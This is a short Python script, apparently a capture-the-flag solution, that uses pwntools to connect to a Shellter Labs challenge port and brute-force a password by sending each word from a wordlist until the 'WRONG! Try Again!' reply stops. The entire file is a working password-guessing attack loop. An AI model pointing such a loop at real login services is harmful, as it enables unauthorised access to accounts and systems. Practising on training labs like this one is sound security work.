#!/usr/bin/python
#By Sql3t0
from pwn import *
import sys

if len(sys.argv) < 3:
	print "Usage: python script.py <port_number> <wordlist>"
else:
	r = remote('lab.shellterlabs.com', sys.argv[1])
	print r.recv(1024)
	count = 0
	for line in open(str(sys.argv[2])): 
		r.send(str(line))
		rec = r.recv(1024)
		sys.stderr.writelines("\r["+str(count)+"]Passwd : "+str(line).replace('\n','')+" -> "+str(rec).replace('\n',''))
		count = count + 1
		if "WRONG! Try Again!" not in rec:
			print("\n[+]Passwd Found : "+str(line))
			break
